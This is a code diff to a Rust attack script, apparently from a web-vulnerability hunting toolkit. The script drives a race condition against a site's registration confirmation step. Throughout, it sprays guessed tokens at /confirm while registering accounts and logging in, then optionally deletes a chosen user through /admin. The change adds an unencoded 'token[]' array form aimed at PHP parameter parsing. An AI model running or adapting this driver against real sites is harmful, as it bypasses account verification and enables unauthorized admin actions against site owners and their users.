@@ -1,8 +1,8 @@
 #!/usr/bin/env rust-script
 //! name: pcreg_race
-//! description: 半构造注册竞态驱动器(partial-construction registration race)- 写侧注册与读侧同窗齐放:确认 worker 以短间隔连续播撒候选 token 电池(空/0/null/false/Array/用户名/邮箱/csrf),每轮注册一个新账号并从独立会话连投登录(会话锁天然把登录摊在窗口上);任一读侧离开基线(确认 400/403、登录非 Invalid username or password)即命中并自动复验登录,可选经 /admin 删除指定用户;一个信封给出逐候选状态直方图、命中项、逐轮注册耗时与复验/删除回执
-//! version: 1.0.1
-//! args: <base-url> [--email-domain ginandjuice.shop] [--tag S] [--rounds N] [--logins-per-round N] [--workers N] [--interval-ms N] [--candidates 'a,b,c'] [--password P] [--verify-polls N] [--delete-user U] [--snippet N] [--timeout-ms N] [--selftest]
+//! description: 半构造注册竞态驱动器(partial-construction registration race)- 写侧注册与读侧同窗齐放:确认 worker 以短间隔连续播撒候选 token 电池(空/0/null/false/Array/用户名/邮箱/csrf),每轮注册一个新账号并从独立会话连投登录(会话锁天然把登录摊在窗口上);任一读侧离开基线(确认 400/403、登录非 Invalid username or password)即命中并自动复验登录,可选经 /admin 删除指定用户;一个信封给出逐候选状态直方图、命中项、逐轮注册耗时与复验/删除回执。--raw-param 候选原样入 URL 不编码,可发字面 token[] 数组形。
+//! version: 1.0.2
+//! args: <base-url> [--email-domain ginandjuice.shop] [--tag S] [--rounds N] [--logins-per-round N] [--workers N] [--interval-ms N] [--candidates 'a,b,c'] [--password P] [--raw-param] [--verify-polls N] [--delete-user U] [--snippet N] [--timeout-ms N] [--selftest]
 //! keywords: 漏洞猎手套件, 竞态, race, partial construction, 半构造, 注册, confirm, 播撒, spread
 //!
 //! ```cargo
@@ -86,11 +86,22 @@ fn arg(args: &[String], i: usize) -> String {
     args.get(i + 1).cloned().unwrap_or_default()
 }
 
+/// Confirm target: --raw-param emits the candidate unencoded so literal
+/// `token[]` reaches PHP (PHP does not decode %5B%5D inside a parameter
+/// name, the encoded form reads as `token`).
+fn confirm_target(base_confirm: &str, cand: &str, raw: bool) -> String {
+    let v = if raw { cand.to_string() } else { urlencode(cand) };
+    format!("{base_confirm}?token={v}")
+}
+
 fn main() {
     let args: Vec<String> = std::env::args().skip(1).collect();
     if args.iter().any(|a| a == "--selftest") {
         let sample = "<input required type=\"hidden\" name=\"csrf\" value=\"AbC123\">";
-        let ok = csrf_of(sample).as_deref() == Some("AbC123") && snippet("a b c", 2) == "a ...";
+        let ok = csrf_of(sample).as_deref() == Some("AbC123")
+            && snippet("a b c", 2) == "a ..."
+            && confirm_target("https://x/confirm", "[]", true) == "https://x/confirm?token=[]"
+            && confirm_target("https://x/confirm", "[]", false) == "https://x/confirm?token=%5B%5D";
         println!(
             "{}",
             json!({"action": "pcreg_race", "data": {"selftest": ok}, "success": ok})
@@ -119,6 +130,7 @@ fn main() {
         "00000000000000000000000000000000".into(),
     ];
     let mut password = "peter123".to_string();
+    let mut raw_param = false;
     let mut verify_polls = 3usize;
     let mut delete_user = String::new();
     let mut snip = 80usize;
@@ -139,6 +151,7 @@ fn main() {
                     .collect::<Vec<_>>();
             }
             "--password" => password = arg(&args, i),
+            "--raw-param" => raw_param = true,
             "--verify-polls" => verify_polls = arg(&args, i).parse().unwrap_or(verify_polls),
             "--delete-user" => delete_user = arg(&args, i),
             "--snippet" => snip = arg(&args, i).parse().unwrap_or(snip),
@@ -192,6 +205,7 @@ fn main() {
         let sent = sent.clone();
         let agent = agent.clone();
         let url = format!("{base}/confirm");
+        let raw_param = raw_param;
         handles.push(std::thread::spawn(move || {
             let mut idx = 0usize;
             while !stop.load(Ordering::SeqCst) {
@@ -204,7 +218,7 @@ fn main() {
                     }
                 };
                 idx += 1;
-                let target = format!("{url}?token={}", urlencode(&cand));
+                let target = confirm_target(&url, &cand, raw_param);
                 let r = send(&agent, "POST", &target, None, None);
                 *sent.lock().unwrap_or_else(|e| e.into_inner()) += 1;
                 {
